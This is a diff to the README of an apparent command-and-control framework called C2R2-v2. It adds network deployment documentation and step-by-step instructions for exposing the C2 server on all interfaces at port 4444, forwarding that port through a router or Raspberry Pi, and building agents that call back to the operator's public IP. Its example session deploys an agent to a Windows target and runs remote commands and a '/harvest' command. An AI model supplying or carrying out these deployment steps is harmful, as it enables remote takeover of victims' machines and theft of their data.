@@ -29,6 +29,7 @@ By using C2R2-v2, you agree to:
 
 **Complete documentation is available in the [`/docs`](docs/) directory:**
 
+### Core Documentation
 - **[Getting Started](docs/README.md)** - Overview and introduction
 - **[Installation Guide](docs/INSTALLATION.md)** - Build and setup instructions
 - **[Usage Guide](docs/USAGE.md)** - Command reference and examples
@@ -38,6 +39,12 @@ By using C2R2-v2, you agree to:
 - **[Security](docs/SECURITY.md)** - Security considerations and OPSEC
 - **[Contributing](docs/CONTRIBUTING.md)** - How to contribute
 - **[Development](docs/DEVELOPMENT.md)** - Development guide
+
+### Network Deployment Guides
+- **[Network Deployment](docs/NETWORK_DEPLOYMENT.md)** - Complete guide for LAN/WAN deployments
+- **[Raspberry Pi Setup](RASPBERRY_PI_SETUP.md)** - Step-by-step guide for Raspberry Pi with port forwarding
+- **[Troubleshooting](docs/NETWORK_DEPLOYMENT.md#troubleshooting)** - Connection issues and solutions
+- **[Solución de Problemas (Español)](SOLUCION_PROBLEMAS_ES.md)** - Guía de problemas de conexión en español
 
 ---
 
@@ -179,10 +186,12 @@ cargo build --release
 
 ### Running
 
+#### Local Network (LAN)
+
 ```bash
-# Start C2 server
+# Start C2 server (bind to all interfaces for network access)
 cd c2r2-server
-./target/release/c2r2-server
+./target/release/c2r2-server --bind 0.0.0.0 --port 4444
 
 # Deploy agent to target (Windows)
 # Then interact from server:
@@ -191,6 +200,22 @@ C2R2> /select 1
 C2R2 [1]> /cmd whoami
 C2R2 [1]> /harvest
 ```
+
+#### Internet Deployment (Port Forwarding)
+
+For deploying over the internet with port forwarding (e.g., Raspberry Pi):
+
+```bash
+# 1. Configure router port forwarding: external 4444 → internal 4444
+# 2. Open firewall: sudo ufw allow 4444/tcp
+# 3. Start server: ./c2r2-server --bind 0.0.0.0 --port 4444
+# 4. Build agent with PUBLIC IP: --server "YOUR_PUBLIC_IP:4444"
+```
+
+**📖 Having connection issues?** See:
+- **[Raspberry Pi Setup Guide](RASPBERRY_PI_SETUP.md)** - Complete setup for Pi with port forwarding
+- **[Network Deployment Guide](docs/NETWORK_DEPLOYMENT.md)** - Comprehensive network configuration
+- **[Troubleshooting](docs/NETWORK_DEPLOYMENT.md#troubleshooting)** - Common connection problems
 
 **Complete usage guide:** [Usage Documentation](docs/USAGE.md)
 
